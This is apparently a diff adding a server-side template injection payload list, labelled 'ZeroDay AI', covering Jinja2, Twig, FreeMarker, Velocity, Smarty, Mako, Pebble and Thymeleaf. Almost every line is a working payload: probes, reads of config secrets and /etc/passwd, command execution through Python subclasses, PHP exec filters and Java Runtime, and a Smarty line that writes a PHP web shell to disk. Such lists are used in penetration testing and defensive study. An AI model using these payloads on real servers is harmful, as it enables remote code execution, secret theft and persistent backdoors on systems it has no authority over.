@@ -1,0 +1,63 @@
+# SSTI (Server-Side Template Injection) Payloads — ZeroDay AI
+# ─────────────────────────────────────────────────────────────
+
+# Detection probes (all engines)
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+{7*7}
+${{7*7}}
+*{7*7}
+@(7*7)
+{{7*'7'}}
+
+# Jinja2 / Flask
+{{config}}
+{{config.items()}}
+{{settings.SECRET_KEY}}
+{{''.__class__.__mro__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.class.mro()[1].subclasses()[408]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{request.environ['HTTP_HOST']}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{c.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}{% endif %}{% endfor %}
+
+# Twig (PHP)
+{{7*7}}
+{{7*'7'}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{/etc/passwd|file_get_contents}}
+
+# FreeMarker (Java)
+${7*7}
+${.vars['freemarker.template.utility.Execute'?new()("id")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+# Velocity (Java)
+#set($x='')##
+#set($rt = $x.class.forName('java.lang.Runtime'))
+#set($chr = $x.class.forName('java.lang.Character'))
+#set($str = $x.class.forName('java.lang.String'))
+#set($ex = $rt.getRuntime().exec('id'))
+
+# Smarty (PHP)
+{$smarty.version}
+{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+
+# Pebble (Java)
+{{1+1}}
+{%raw%}{{7*7}}{%endraw%}
+
+# Mako (Python)
+${7*7}
+<%
+import os
+x=os.popen('id').read()
+%>${x}
+
+# Thymeleaf
+${T(java.lang.Runtime).getRuntime().exec('id')}
+[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
